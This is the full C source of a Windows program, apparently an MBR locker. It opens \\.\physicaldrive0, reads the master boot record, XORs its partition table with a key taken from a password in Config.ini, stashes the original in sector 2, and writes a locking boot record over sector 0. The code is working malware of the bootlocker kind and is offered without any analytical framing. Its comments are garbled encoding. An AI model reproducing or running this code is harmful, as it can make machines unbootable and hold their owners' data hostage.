#include <windows.h>
#include "bin.h"
#define cryptFlag 445
int ReadDisk(int Id,int num,unsigned char *buffer);
int WriteDisk(int Id,int num,unsigned char* buffer);
int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd )
{
	char keys[256]={0};		//buffer,����������������ini�����ļ��������������
	unsigned char mbr[512]={0};	//���ڱ����Ӳ��MBR�����ȡ������ԭʼ��MBR��Ϣ��
	unsigned char len;//255 
	int i = 0;

	GetPrivateProfileStringA("Locker","psw","left",keys,256,".\\Config.ini");
	len = strlen(keys);
	if (len==0 || len>=18)
	{
		MessageBoxA(NULL,"����!���볤�Ƚ��������0-18��..","Error",MB_OK | MB_ICONERROR);
		exit(-1);
	}
	byte XResult=0;				//�������ֵ
	for (i= 0; i < len; ++i)
		XResult^=keys[i];

	if(ReadDisk(0,1,mbr)==0)
	{
		MessageBoxA(NULL,"Read MBR failed!","Error",MB_OK | MB_ICONERROR);
		exit(-1);
	}

	if (mbr[cryptFlag] == 0x16)
	{
		MessageBoxA(NULL,"����!Ӳ���Ѽ������벻Ҫ�ظ���������..","Error",MB_OK | MB_ICONERROR);
		exit(-1);
	}
	mbr[cryptFlag] = 0x16;
	for (i = 0; i < 64; ++i)
		mbr[446+i]^=XResult;
	WriteDisk(2,1,mbr);//��ԭʼ�������򱣴浽��3����
	memcpy(lock_disk+cryptFlag,mbr+cryptFlag,67);
	WriteDisk(0,1,lock_disk);//д����ܵ�MBR
	MessageBoxA(NULL,"��ϲ������ɹ���!!!\n�벻Ҫ�ظ�����!\n","Success",MB_OK | MB_ICONINFORMATION);
	return 0;
}
int ReadDisk(int Id,int num,unsigned char *buffer)
{
	/*
	��ȡ����
	id = ID��
	num = ��ȡ����
	�ɹ����ض�ȡ�ֽ���
	*/
	HANDLE hFile=NULL;
	int offset=0;
	int ReadSize=0;
	DWORD Readed=0;
	offset = Id*512;
	ReadSize = num*512;
	if (buffer==NULL)
	{
		return ReadSize;
	}
	hFile = CreateFileA("\\\\.\\\\physicaldrive0",
		GENERIC_READ,
		FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,NULL);
	if (hFile==INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL,"���ܴ� \\\\.\\\\physicaldrive0..","Error",MB_OK | MB_ICONERROR);
		return 0;
	}
	SetFilePointer(hFile,offset,0,0);
	ReadFile(hFile,buffer,ReadSize,&Readed,NULL);
	CloseHandle(hFile);
	return Readed;
}
int WriteDisk(int Id,int num,unsigned char* buffer)
{
	/*
	д����
	*/
	HANDLE hFile = NULL;
	int WriteSize = 0;
	int offset = 0;
	DWORD Writed = 0;
	offset = Id*512;
	WriteSize = num*512;
	if (buffer==NULL)
	{
		return WriteSize;
	}
	//Open it
	hFile = CreateFileA("\\\\.\\\\physicaldrive0",1073741824, 1, 0, 3, 128, 0);
	if (hFile==INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL,"���ܴ� \\\\.\\\\physicaldrive0..","Error",MB_OK | MB_ICONERROR);
		return 0;
	}
	SetFilePointer (hFile, offset, 0, 0);
	WriteFile(hFile,buffer,WriteSize,&Writed,0);
	CloseHandle(hFile);
	return WriteSize;
}
